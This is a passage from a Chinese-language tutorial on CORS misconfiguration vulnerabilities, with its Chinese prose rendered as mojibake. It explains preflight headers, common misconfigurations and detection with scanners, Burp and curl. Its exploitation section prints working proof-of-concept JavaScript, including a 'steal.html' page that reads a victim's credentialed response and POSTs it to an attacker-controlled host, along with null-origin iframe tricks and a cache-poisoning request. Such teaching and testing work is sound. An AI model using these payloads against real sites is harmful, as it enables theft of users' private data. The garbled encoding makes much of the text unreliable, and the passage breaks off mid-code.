èƒ½ä¸èƒ½é€å‡ºï¼Œé€™å°±æ˜¯ Preflight Request çš„ç›®çš„ã€‚ é¢„æ£€è¯·æ±‚çš„å›åº” æœåŠ¡å™¨æ”¶åˆ°\"é¢„æ£€\"è¯·æ±‚ä»¥åï¼Œæ£€æŸ¥äº† Originâ€‹â€‹ã€Access-Control-Request-Methodâ€‹ â€‹å’Œ Access-Control-Request-Headersâ€‹ â€‹å­—æ®µä»¥åï¼Œç¡®è®¤å…è®¸è·¨æºè¯·æ±‚ï¼Œå°±å¯ä»¥åšå‡ºå›åº”ã€‚ HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain ä¸Šé¢çš„ HTTP å›åº”ä¸­ï¼Œå…³é”®çš„æ˜¯ Access-Control-Allow-Originâ€‹â€‹ â€‹å­—æ®µï¼Œè¡¨ç¤º http://api.bob.comâ€‹â€‹ â€‹å¯ä»¥è¯·æ±‚æ•°æ®ã€‚è¯¥å­—æ®µä¹Ÿå¯ä»¥è®¾ä¸ºæ˜Ÿå·ï¼Œè¡¨ç¤ºåŒæ„ä»»æ„è·¨æºè¯·æ±‚ã€‚ Access-Control-Allow-Origin: * å¦‚æœæœåŠ¡å™¨å¦å®šäº†\"é¢„æ£€\"è¯·æ±‚ï¼Œä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½• CORS ç›¸å…³çš„å¤´ä¿¡æ¯å­—æ®µã€‚è¿™æ—¶ï¼Œæµè§ˆå™¨å°±ä¼šè®¤å®šï¼ŒæœåŠ¡å™¨ä¸åŒæ„é¢„æ£€è¯·æ±‚ï¼Œå› æ­¤è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œè¢« XMLHttpRequestâ€‹â€‹ â€‹å¯¹è±¡çš„ onerrorâ€‹â€‹ â€‹å›è°ƒå‡½æ•°æ•è·ã€‚æ§åˆ¶å°ä¼šæ‰“å°å‡ºå¦‚ä¸‹çš„æŠ¥é”™ä¿¡æ¯ã€‚ XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. æœåŠ¡å™¨å›åº”çš„å…¶ä»– CORS ç›¸å…³å­—æ®µå¦‚ä¸‹ã€‚ Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 ï¼ˆ1ï¼‰Access-Control-Allow-Methods è¯¥å­—æ®µå¿…éœ€ï¼Œå®ƒçš„å€¼æ˜¯é€—å·åˆ†éš”çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰è·¨åŸŸè¯·æ±‚çš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œè¿”å›çš„æ˜¯æ‰€æœ‰æ”¯æŒçš„æ–¹æ³•ï¼Œè€Œä¸å•æ˜¯æµè§ˆå™¨è¯·æ±‚çš„é‚£ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ä¸ºäº†é¿å…å¤šæ¬¡\"é¢„æ£€\"è¯·æ±‚ã€‚ ï¼ˆ2ï¼‰Access-Control-Allow-Headers å¦‚æœæµè§ˆå™¨è¯·æ±‚åŒ…æ‹¬ Access-Control-Request-Headersâ€‹ â€‹å­—æ®µï¼Œåˆ™ Access-Control-Allow-Headersâ€‹ â€‹å­—æ®µæ˜¯å¿…éœ€çš„ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ï¼Œè¡¨æ˜æœåŠ¡å™¨æ”¯æŒçš„æ‰€æœ‰å¤´ä¿¡æ¯å­—æ®µï¼Œä¸é™äºæµè§ˆå™¨åœ¨\"é¢„æ£€\"ä¸­è¯·æ±‚çš„å­—æ®µã€‚ ï¼ˆ3ï¼‰Access-Control-Allow-Credentials è¯¥å­—æ®µä¸ç®€å•è¯·æ±‚æ—¶çš„å«ä¹‰ç›¸åŒã€‚ ï¼ˆ4ï¼‰Access-Control-Max-Age è¯¥å­—æ®µå¯é€‰ï¼Œç”¨æ¥æŒ‡å®šæœ¬æ¬¡é¢„æ£€è¯·æ±‚çš„æœ‰æ•ˆæœŸï¼Œå•ä½ä¸ºç§’ã€‚ä¸Šé¢ç»“æœä¸­ï¼Œæœ‰æ•ˆæœŸæ˜¯ 20 å¤©ï¼ˆ1728000 ç§’ï¼‰ï¼Œå³å…è®¸ç¼“å­˜è¯¥æ¡å›åº” 1728000 ç§’ï¼ˆå³ 20 å¤©ï¼‰ï¼Œåœ¨æ­¤æœŸé—´ï¼Œä¸ç”¨å‘å‡ºå¦ä¸€æ¡é¢„æ£€è¯·æ±‚ã€‚ æµè§ˆå™¨çš„æ­£å¸¸è¯·æ±‚å’Œå›åº” ä¸€æ—¦æœåŠ¡å™¨é€šè¿‡äº†\"é¢„æ£€\"è¯·æ±‚ï¼Œä»¥åæ¯æ¬¡æµè§ˆå™¨æ­£å¸¸çš„ CORS è¯·æ±‚ï¼Œå°±éƒ½è·Ÿç®€å•è¯·æ±‚ä¸€æ ·ï¼Œä¼šæœ‰ä¸€ä¸ª Originâ€‹â€‹ â€‹å¤´ä¿¡æ¯å­—æ®µã€‚æœåŠ¡å™¨çš„å›åº”ï¼Œä¹Ÿéƒ½ä¼šæœ‰ä¸€ä¸ª Access-Control-Allow-Originâ€‹â€‹ â€‹å¤´ä¿¡æ¯å­—æ®µã€‚ ä¸‹é¢æ˜¯\"é¢„æ£€\"è¯·æ±‚ä¹‹åï¼Œæµè§ˆå™¨çš„æ­£å¸¸ CORS è¯·æ±‚ã€‚ PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... ä¸Šé¢å¤´ä¿¡æ¯çš„ Originâ€‹ â€‹å­—æ®µæ˜¯æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ çš„ã€‚ ä¸‹é¢æ˜¯æœåŠ¡å™¨æ­£å¸¸çš„å›åº”ã€‚ Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 ä¸Šé¢å¤´ä¿¡æ¯ä¸­ï¼ŒAccess-Control-Allow-Originâ€‹ â€‹å­—æ®µæ˜¯æ¯æ¬¡å›åº”éƒ½å¿…å®šåŒ…å«çš„ã€‚ 0x03 CORS é”™è¯¯é…ç½®ç±»å‹ åå°„ Origin å¤´ å¦‚ä¸‹é…ç½®ï¼š Access-Control-Allow-Origin: http://a.com, http://c.com æˆ–è€… Access-Control-Allow-Origin: http://*.a.com è¿™ä¸¤ç§åŸŸåäº‹å®ä¸Šé…ç½®æ˜¯é”™è¯¯çš„ï¼Œå› ä¸º CORS æ ‡å‡†è§„å®šï¼ŒAccess-Control-Allow-Originâ€‹â€‹ åªèƒ½é…ç½®ä¸ºå•ä¸ª origin, nullâ€‹â€‹ æˆ– *â€‹â€‹ã€‚å¦‚æœå¼€å‘è€…æƒ³è¦å®ç°åŒæ—¶ä¸å¤šä¸ªåŸŸåå…±äº«åŸŸåçš„éœ€æ±‚ï¼Œåˆ™éœ€è¦ä¸“é—¨ç¼–å†™ä»£ç æˆ–è€…ä½¿ç”¨æ¡†æ¶æ¥ååŠ©åŠ¨æ€ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ æœ€ç®€å•åœ°åŠ¨æ€ç”Ÿæˆè®¿é—®æ§åˆ¶ç­–ç•¥çš„æ–¹æ³•ï¼Œå°±æ˜¯åœ¨ Access-Control-Allow-Origin ä¸­åå°„è¯·æ±‚çš„ Origin å€¼ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªé”™è¯¯ Nginx é…ç½®ç¤ºä¾‹ï¼š add_header \"Access-Control-Allow-Origin\" $http_origin; // å•çº¯çš„ add_header â€œAccess-Control-Allow-Credentialsâ€ â€œtrueâ€; è¿™ç§é…ç½®éå¸¸å±é™©ï¼Œç›¸å½“äºä¿¡ä»»ä»»æ„ç½‘ç«™ï¼Œç»™æ”»å‡»è€…ç½‘ç«™æ•å¼€äº†å¤§é—¨ã€‚ä»»æ„æ”»å‡»è€…ç½‘ç«™å¯ä»¥ç›´æ¥è·¨åŸŸè¯»å–å…¶èµ„æºå†…å®¹ã€‚ Origin æ ¡éªŒé”™è¯¯ å‰ç¼€åŒ¹é…: èµ„æºæœåŠ¡å™¨åœ¨æ£€æŸ¥è¯·æ±‚ä¸­ Origin å€¼æ—¶ï¼ŒåªåŒ¹é…äº†å‰ç¼€ã€‚ä¾‹å¦‚ www.example.com æƒ³è¦å…è®¸ example.com è®¿é—®ï¼Œä½†æ˜¯åªåšäº†å‰ç¼€åŒ¹é…ï¼Œå¯¼è‡´åŒæ—¶ä¿¡ä»»äº† example.com.attack.com çš„è®¿é—®ï¼Œè€Œ example.com.attack.com æ˜¯æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„ç½‘ç«™ã€‚ åç¼€åŒ¹é…ï¼šèµ„æºæœåŠ¡å™¨åœ¨æ£€æŸ¥è¯·æ±‚ä¸­ Origin å€¼æ—¶ï¼Œåªåšäº†åç¼€åŒ¹é…ã€‚ä¾‹å¦‚ www.example.com æƒ³è¦å…è®¸ example.com è®¿é—®ï¼Œç”±äºåç¼€åŒ¹é…å‡ºé”™ï¼Œå¯¼è‡´å…è®¸ attackexample.com è®¿é—®ã€‚ æ²¡æœ‰è½¬ä¹‰ .â€‹â€‹ï¼šä¾‹å¦‚ï¼Œexample.com æƒ³è¦å…è®¸ www.example.com è®¿é—®æ—¶ï¼Œä½†æ­£åˆ™åŒ¹é…æ²¡æœ‰è½¬ä¹‰ .â€‹â€‹ï¼Œå¯¼è‡´å…è®¸ wwwaexample.com è®¿é—®ã€‚ åŒ…å«åŒ¹é…ï¼šæˆ‘ä»¬è¿˜å‘ç°æœ‰çš„ç½‘ç«™ www.example.com æƒ³è¦å…è®¸ example.comï¼Œä½†æ˜¯ Origin æ ¡éªŒå‡ºé”™ï¼Œå‡ºç°å…è®¸ ample.com è®¿é—®ã€‚ ä¿¡ä»» null RFC 6564 è§„å®šï¼Œå¦‚æœè¯·æ±‚æ¥è‡ªéšç§æ•æ„Ÿä¸Šä¸‹æ–‡æ—¶ï¼ŒOrigin å¤´çš„å€¼åº”è¯¥ä¸º nullï¼Œä½†æ˜¯å®ƒå´æ²¡æœ‰æ˜ç¡®ç•Œå®šä»€ä¹ˆæ˜¯éšç§æ•æ„Ÿä¸Šä¸‹æ–‡ã€‚ CORS åè®®å¤ç”¨äº† Origin å¤´ï¼Œæœ‰äº›å¼€å‘è€…åœ¨ç½‘ç«™ä¸Šé…ç½®ä¿¡ä»» nullï¼Œç”¨äºä¸æœ¬åœ° file é¡µé¢å…±äº«æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true ä½†æ˜¯äº‹å®ä¸Šï¼Œé™¤äº†æœ¬åœ° file é¡µé¢çš„è·¨åŸŸè¯·æ±‚ Origin å¤´ä¸º null å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥ä»ä»»æ„åŸŸä¸‹é€šè¿‡ iframe sandbox æ„é€  Origin ä¸º null çš„è·¨åŸŸè¯·æ±‚ï¼Œå¦‚ä¸‹æ˜¯ä¸€æ®µç¤ºæ„ä»£ç ï¼š XMLHttpRequest hereâ€™> è¿™å°±æ„å‘³ç€ä»»ä½•é…ç½®æœ‰ Access-Control-Allow-Origin: nullâ€‹â€‹ â€‹å’Œ Access-Control-Allow-Credentials:trueâ€‹â€‹ â€‹çš„ç½‘ç«™ç­‰åŒäºæ²¡æœ‰æµè§ˆå™¨ SOP çš„ä¿æŠ¤ï¼Œéƒ½å¯ä»¥è¢«å…¶ä»–ä»»æ„åŸŸä»¥è¿™ç§æ–¹å¼è¯»å–å†…å®¹ã€‚ e.g. var xhr=new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { alert(xhr.responseText); } } xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", true); xhr.withCredentials = true; xhr.send();'> HTTPS åŸŸä¿¡ä»» HTTP åŸŸ ä¸­é—´äººæ”»å‡»è€…å¯ä»¥å…ˆåŠ«æŒå—ä¿¡ä»» HTTP åŸŸï¼Œç„¶åé€šè¿‡è¿™ä¸ªåŸŸå‘é€è·¨åŸŸè¯·æ±‚åˆ° HTTPS ç½‘ç«™ï¼Œé—´æ¥è¯»å– HTTPS åŸŸä¸‹çš„å—ä¿æŠ¤å†…å®¹ã€‚ ä¿¡ä»»è‡ªèº«å…¨éƒ¨å­åŸŸ å¾ˆå¤šç½‘ç«™ä¸ºäº†æ–¹ä¾¿ä¼šå°† CORS é…ç½®ä¸ºä¿¡ä»»å…¨éƒ¨è‡ªèº«å­åŸŸï¼Œè¿™ç§é…ç½®ä¼šå¯¼è‡´å­åŸŸ XSS çš„å±å®³è¢«å¼ºåŒ–ã€‚ä¸ºäº†é˜²æ­¢æŸä¸ªå­åŸŸä¸Š XSS æ¼æ´çš„å±å®³å…¶ä»–å­åŸŸï¼Œæµè§ˆå™¨è®¾è®¡äº† Cookie çš„ httponly æ ‡å¿—ï¼Œç”¨äºé™åˆ¶ Javascript è¯»å– Cookieï¼Œå› æ­¤æŸä¸ªå­åŸŸ XSS ä¸èƒ½è¯»å–å¸¦æœ‰ httponly æ ‡è®°çš„ Cookieï¼Œéš¾ä»¥çªƒå–å…¶ä»–é‡è¦å­åŸŸä¸Šçš„æ•æ„Ÿå†…å®¹ã€‚ ä½†æ˜¯å¦‚æœè¿™ä¸ªåŸŸé…ç½®äº† CORS ä¸”ä¿¡ä»»å…¨éƒ¨å­åŸŸï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ä»–ä»»æ„å­åŸŸä¸Š XSS æ¼æ´ï¼Œå‘é€è·¨åŸŸè¯·æ±‚åˆ°ç›®æ ‡é‡è¦åŸŸç½‘ç«™ï¼Œä»è€Œè·å–æ•æ„Ÿå†…å®¹ã€‚ â€‹Origin:*â€‹â€‹â€‹ ä¸ Credentials:trueâ€‹â€‹â€‹ å…±ç”¨ CORS è§„å®šï¼ŒAccess-Control-Allow-Origin:*â€‹â€‹ ä¸ Access-Control-Allow-Credentials:trueâ€‹â€‹ ä¸èƒ½åŒæ—¶ä½¿ç”¨ã€‚æµè§ˆå™¨ä¼šå¯¹ä¸‹é¢è¿™ç§è¯¯é…ç½®æŠ¥é”™ï¼š Access-Control-Allow-Origin: * Access-Control-Allow-Credentials: true è¿™å°±æ„å‘³ç€ï¼ŒAccess-Control-Allow-Origin:*â€‹â€‹ åªèƒ½ç”¨äºå…±äº«å…¬å¼€èµ„æºã€‚ ç¼ºå°‘ Vary:Originâ€‹â€‹â€‹ å¤´ å½“èµ„æºæœåŠ¡å™¨éœ€è¦å…±äº«å¤šä¸ªåŸŸåæ—¶ï¼Œå®ƒéœ€è¦æ¯ä¸ªä¸åŒè¯·æ±‚åŸŸçš„è·¨åŸŸè¯·æ±‚ç”Ÿæˆä¸åŒçš„è®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ä½†ä¸€æ—¦è¿™ä¸ªèµ„æºå†…å®¹éœ€è¦è¢«ç¼“å­˜ï¼Œåˆ™ä¼šå¸¦æ¥ CORS å¤±æ•ˆé—®é¢˜ã€‚ä¾‹å¦‚ï¼Œc.com åŒæ—¶å…è®¸ a.com å’Œ b.com å…±äº«ã€‚c.com èµ„æºå†…å®¹é¦–å…ˆè¢« a.com è„šæœ¬è·¨åŸŸè®¿é—®åè¢«ç¼“å­˜ï¼Œå…¶ä¸­ç¼“å­˜å“åº”å¤´ä¸º Access-Control-Allow-Origin: http://a.comâ€‹â€‹â€ã€‚è¿™æ—¶ï¼Œb.com è„šæœ¬åˆ™ä¸èƒ½è¯»å–ç¼“å­˜å“åº”å†…å®¹ï¼Œå› ä¸ºç¼“å­˜å“åº”å¤´æ˜¯å…è®¸ a.com å…±äº«ï¼Œè€Œä¸æ˜¯ b.comã€‚HTTP åè®®æä¾›äº† Vary å¤´ï¼Œç”¨äºè§£å†³è¿™ç§æƒ…å†µï¼Œèµ„æºæœåŠ¡å™¨éœ€è¦åœ¨å“åº”å¤´ä¸­é…ç½® Vary:Originâ€‹â€‹ å¤´æ¥æŒ‡å¯¼ç¼“å­˜ï¼Œä¸ºæ¯ä¸ªä¸åŒçš„ Origin å¤´ç¼“å­˜ä¸€ä»½ä¸åŒçš„å†…å®¹ã€‚ 0x04 æŒ–æ˜åˆ©ç”¨ CORS çš„æ¼æ´ä¸»è¦çœ‹å½“æˆ‘ä»¬å‘èµ·çš„è¯·æ±‚ä¸­å¸¦æœ‰ Origin å¤´éƒ¨å­—æ®µæ—¶ï¼ŒæœåŠ¡å™¨çš„è¿”å›åŒ…å¸¦æœ‰ CORS çš„ç›¸å…³å­—æ®µå¹¶ä¸”å…è®¸ Origin çš„åŸŸè®¿é—®ã€‚ å˜æ¢è¯·æ±‚å¤´çš„ origin å­—æ®µï¼Œå¦‚æœè¿”å›åŒ…ä¸­çš„ Access-Control-Allow-Originâ€‹â€‹ å†…å®¹å’Œå‘é€çš„ origin å¤´å†…å®¹ç›¸åŒï¼Œåˆ™å­˜åœ¨æ­¤é—®é¢˜ã€‚ åˆ©ç”¨ å‰æï¼šå«æœ‰ CORS é…ç½®çš„ç½‘ç«™ åˆ©ç”¨ html æ ‡ç­¾å’Œè¡¨å•å‘é€è¯·æ±‚ è®¿é—®å†…ç½‘æ•æ„Ÿèµ„æº ç»•è¿‡è¿”ä¼šè¯åŠ«æŒ ä¸€èˆ¬å½¢å¼è·¨åŸŸè¯·æ±‚åˆ©ç”¨ åœ¨æ”»å‡»è€…è‡ªå·±æ§åˆ¶çš„ç½‘é¡µä¸ŠåµŒå…¥è·¨åŸŸè¯·æ±‚ï¼Œç”¨æˆ·è®¿é—®é“¾æ¥ï¼Œæ‰§è¡Œäº†è·¨åŸŸè¯·æ±‚ï¼Œä»è€Œæ”»å‡»ç›®æ ‡ã€‚ æ–¹æ³•ä¸€ï¼šæ£€æµ‹å·¥å…· GitHub - chenjj/CORScanner: ğŸ¯ Fast CORS misconfiguration vulnerabilities scanner EXP & POC Hello,this is evil page. CORS POC Exploit Exploit function corsExploit() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function () { if (xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { //var datas=xhr.responseText; //alert(datas); //document.getElementById(\"demo\").innerHTML = alert(this.responseText); document.getElementById(\"demo\").innerHTML = alert(xhr.responseText); } } // request vuln pageï¼Œéœ€è¦æ”»å‡»çš„ç›®æ ‡ xhr.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr.send(); } ç»•è¿‡ http_only è·å– cookie åœ¨æ”»å‡»è¿™æœåŠ¡å™¨åˆ›å»º cookiebypass.jspâ€‹â€‹ åœ¨æ”»å‡»è€…å¯æ§ç½‘ç«™åˆ›å»º steal.htmlâ€‹â€‹ cors exploit function exploit() { var xhr1; var xhr2; if (window.XMLHttpRequest) { xhr1 = new XMLHttpRequest(); xhr2 = new XMLHttpRequest(); } else { xhr1 = new ActiveXObject(\"Microsoft.XMLHTTP\"); xhr2 = new ActiveXObject(\"Microsoft.XMLHTTP\"); } xhr1.onreadystatechange = function () { if (xhr1.readyState == 4 && xhr1.status == 200) { var datas = xhr1.responseText; // æ”»å‡»è¿™æœåŠ¡å™¨åœ°å€ xhr2.open(\"POST\", \"http://mob.exp:8081/manager/cookiebypass.jsp\", \"true\"); xhr2.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xhr2.send(\"ck=\" + escape(datas)); } } // éœ€è¦æ”»å‡»çš„ç›®æ ‡ xhr1.open(\"GET\", \"http://www.vuln.com:8081/cors/corsvuln.jsp\", \"true\") xhr1.withCredentials = true; xhr1.send(); } exploit(); è®¿é—® mob.exp:8081/manager/steal.htmlï¼Œå¯ä»¥çœ‹åˆ°è¿”å›å†…å®¹å†™å…¥ secrect.html ä¸­ã€‚ æ–¹æ³•äºŒï¼šåˆ©ç”¨ Burpsuit æ­å»ºæµ‹è¯•ç¯å¢ƒï¼ŒNginx é…ç½®å¦‚ä¸‹ï¼š é€‰æ‹© Proxy -- Options -- Match and Replaceï¼Œå‹¾é€‰ Request headerã€‚ å°†ç©ºæ›¿æ¢ä¸º Origin:foo.example.orgâ€‹â€‹â€‹ çš„ Enable æ¡†ã€‚ ç„¶ååœ¨ç½‘ç«™ä¸€é˜µä¹±ç‚¹ï¼Œæœ€ååœ¨ HTTP history æ¥ç­›é€‰å¸¦æœ‰ CORS å¤´éƒ¨çš„å€¼ï¼Œç„¶åç”¨ä»¥ä¸Šå·¥å…·æŸ¥çœ‹æ˜¯å¦æœ‰é…ç½®ç¼ºé™·ã€‚ Burpsuiteï¼šè‡ªåŠ¨åœ¨ HTTP è¯·æ±‚åŒ…ä¸­åŠ ä¸Š Origin çš„å¤´éƒ¨å­—æ®µã€‚ åœ¨ Filter by search term ä¸­è¾“å…¥ï¼šAccess-Control-Allow-Origin: foo.example.orgâ€‹â€‹ HTTP history åˆ—è¡¨ä¸­å‡ºç°ç¬¦åˆæ¡ä»¶çš„è¯·æ±‚åŒ…ï¼Œç‚¹å‡» Ctrl+Rï¼ˆå‘é€åˆ° Repeaterï¼‰ï¼Œç‚¹å‡» GOï¼Œè§‚å¯Ÿè¿”å›çš„ CORS é…ç½®ã€‚ æ–¹æ³•ä¸‰ï¼šcurl å‘½ä»¤ curl å‘½ä»¤ï¼Œè¾“å…¥ curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H \"Origin:https://example.com/\" -I æ–¹æ³•å››ï¼šæµè§ˆå™¨æµ‹è¯• åˆ©ç”¨ Ajax å‘é€ä¸€ä¸ªç®€å•è¯·æ±‚ï¼Œçœ‹æ˜¯å¦å…è®¸ã€‚ var url = 'http://172.16.10.113/xxxxmail'; var xhr = new XMLHttpRequest(); xhr.open('GET', url, true); xhr.send(); // æˆ–è€… $.get(\"http://172.16.10.113/xxxxmail\") ======== # æµè§ˆå™¨æ§åˆ¶å°ç¤ºä¾‹ # åœ¨æœåŠ¡å™¨ï¼ˆè¢«æ”»å‡»ç›®æ ‡ï¼‰ 192.168.202.110 ä¸Šé…ç½®æœ‰æ¼æ´çš„ nginx.conf # æ‰“å¼€æ”»å‡»è€…çš„ç½‘ç«™ http://xxx.xxx.xxx/ï¼Œï¼ˆæˆ–è€…éšä¾¿ä¸€ä¸ªç½‘ç«™ï¼‰å†æ‰“å¼€æ§åˆ¶å° # åœ¨å…è®¸çš„åŸŸï¼ˆç½‘ç«™ï¼‰ï¼Œæ‰“å¼€æ§åˆ¶å° $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: Æ’, getAllResponseHeaders: Æ’, setRequestHeader: Æ’, overrideMimeType: Æ’, â€¦} # ä¸å…è®¸çš„åŸŸ $.get(\"http://192.168.202.110:8081\") {readyState: 1, getResponseHeader: Æ’, getAllResponseHeaders: Æ’, setRequestHeader: Æ’, overrideMimeType: Æ’, â€¦} /xxxmail/xxx4/index.jsp Access to XMLHttpRequest at 'http://192.168.202.110:8081/' from origin 'http://172.16.10.113' has been blocked by CORS policy: The 'Access-Control-Allow-Origin' header has a value 'http://mt.icoremail.net' that is not equal to the supplied origin. loginCommon.c2f53.js:1 GET http://192.168.202.110:8081/ net::ERR_FAILED 200 (OK) send @ å®éªŒæµ‹è¯• ç¯å¢ƒå‡†å¤‡ æˆ‘ä»¬é¦–å…ˆä¿®æ”¹ host æ–‡ä»¶ï¼ŒåŠ ä¸Š 127.0.0.1 mob.exp 127.0.0.1 www.vuln.com è¿™æ ·æˆ‘ä»¬è®¿é—® www.vuln.com å°±ç›¸å½“äºæœåŠ¡ç«¯ã€‚æœåŠ¡ç«¯æ–°å»º corsvuln.jspã€‚ Vulnerability Page æ¥ç€åœ¨ hacker ç«¯ mob.exp æ„é€  steal.htmlï¼Œè¿™é‡Œæˆ‘ä»¬å‡è®¾æ˜¯ http://mob.exp:8081/manager/steal.html Hello,this is evil page. function loadXMLDoc() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function() { if(xhr.readyState == 4 && xhr.status == 200) //if receive xhr response { var datas=xhr.responseText; alert(datas); } } // request vuln pageï¼Œå­˜åœ¨æ¼æ´çš„æ”»å‡»ç›®æ ‡ xhr.open(\"GET\",\"http://www.vuln.com:8081/cors/corsvuln.jsp\",\"true\") xhr.send(); } loadXMLDoc(); æ ¹æ®åŒæºç­–ç•¥ï¼Œè¿™æ˜¯ä¸å…è®¸çš„ï¼Œç»“æœä¹Ÿå’Œæˆ‘ä»¬æƒ³çš„ä¸€æ ·ã€‚ ä¸Šé¢è¯´è¿‡ï¼ŒåŒæºç­–ç•¥å¹¶ä¸é™åˆ¶è¯·æ±‚çš„å‘èµ·å’Œå“åº”ï¼Œåªæ˜¯æµè§ˆå™¨æ‹’ç»äº† js å¯¹å“åº”èµ„æºçš„æ“ä½œï¼Œè¿™ç‚¹æˆ‘ä»¬æŠ“åŒ…å°±å¯ä»¥çœ‹å‡ºæ¥ã€‚ï¼ˆæ‰€ä»¥è¯´æµ‹è¯•æ–¹æ³•ä¸­çš„ 1 æ˜¯ä¸å¯¹çš„ï¼‰ æˆ‘ä»¬ä¿®æ”¹ corsvuln.jsp ä½¿ç”¨ CORS ä½¿å…¶å¯ä»¥è·¨åŸŸè®¿é—®ï¼Œæ·»åŠ ä¸€ä¸ª Access-Control-Allow-Origin çš„è¿”å›å¤´ã€‚ response.setHeader(\"Access-Control-Allow-Origin\", \"http://mob.exp:8081\"); å†æ¬¡è®¿é—® mob.exp:8081/manager/steal.html å‘ç°å¯ä»¥æ­£å¸¸ alert äº†ï¼ŒæˆåŠŸå®ç°äº†è·¨åŸŸèµ„æºçš„è¯·æ±‚ã€‚ æˆ‘ä»¬åªæ˜¯åœ¨å“åº”å¤´åŠ ä¸Šäº† Access-Control-Allow-Origin: http://mob.exp:8081â€‹â€‹ æµè§ˆå™¨çœ‹åˆ°è¿™ä¸ªï¼Œè®¤ä¸ºè¿™æ˜¯æœåŠ¡ç«¯å…è®¸çš„è·¨åŸŸè¯·æ±‚ï¼Œå°±ä¸å†é˜»æ‹¦ js å¯¹è·å–å†…å®¹çš„æ“ä½œäº†ã€‚ è·å–ç”¨æˆ·å‡­è¯ æ–¹å¼ä¸€ï¼šå­˜åœ¨ç”¨æˆ·å‡­è¯ Access-Control-Allow-Origin â€œè®¿é—®æ§åˆ¶å…è®¸å‡­æ®â€å€¼ æ˜¯å¦å¯åˆ©ç”¨ å¤‡æ³¨ æ”»å‡»è€…æŒæ¡çš„åŸŸå çœŸçš„ æ˜¯ * çœŸçš„ å¦ æµè§ˆå™¨æŠ¥é”™ nullï¼ˆç©ºå€¼ï¼‰ çœŸçš„ æ˜¯ ä»»æ„ç½‘ç«™ä½¿ç”¨æ²™ç›’ iframe æ¥è·å– null æº æœç‹è§†é¢‘ CORS è¯¯é…ç½®æ¼æ´æ¼”ç¤ºï¼šhttps://www.youtube.com/watch?v=PWbPbtyyNi8 æ–¹å¼äºŒï¼šä¸å­˜åœ¨ç”¨æˆ·å‡­è¯ Access-Control-Allow-Origin æ˜¯å¦å¯åˆ©ç”¨ æ”»å‡»è€…æŒæ¡çš„åŸŸå æ˜¯ nullï¼ˆç©ºå€¼ï¼‰ æ˜¯ * æ˜¯ ç»•è¿‡åŸºäº IP çš„è®¤è¯ å¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºä¸å—å®³è€…çš„ç½‘ç»œå¯è¾¾æ€§ï¼Œå¹¶ä¸”ç›®æ ‡åº”ç”¨ç¨‹åºä½¿ç”¨ IP åœ°å€ä½œä¸ºèº«ä»½éªŒè¯çš„æ–¹å¼ï¼Œåˆ™é»‘å®¢ä¼šåˆ©ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†å»è®¿é—®é‚£äº›ç›®æ ‡åº”ç”¨ç¨‹åºå¹¶ä¸”å¯ä»¥ç»•è¿‡é‚£äº›åŸºäº IP çš„èº«ä»½éªŒè¯ã€‚ å®¢æˆ·ç«¯ç¼“å­˜ä¸­æ¯’ ä¾‹å¦‚ï¼Œæ•°æ®æŠ¥æ–‡å¤´éƒ¨ä¸­åŒ…å« X-User æ ‡å¤´ï¼Œå…¶å€¼æœªè¿›è¡Œä»»ä½•è¾“å…¥éªŒè¯ï¼Œè¾“å‡ºç¼–ç ã€‚ è¯·æ±‚åŒ… GET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: å“åº”åŒ… Access-Control-Allow-Origin å·²è¢«è®¾ç½®ï¼ŒAccess-Control-Allow-Credentials: true ä¸ Vary: Origin å¤´å·²ç»è®¾ç½®ã€‚ HTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ â€¦ Content-Type: text/html â€¦ Invalid user: æ„é€ å­˜åœ¨æ¶æ„çš„ XSS æœ‰æ•ˆè´Ÿè½½é¡µé¢ï¼Œè¯±ä½¿å—å®³è€…è§¦å‘ã€‚ var req = new XMLHttpRequest(); 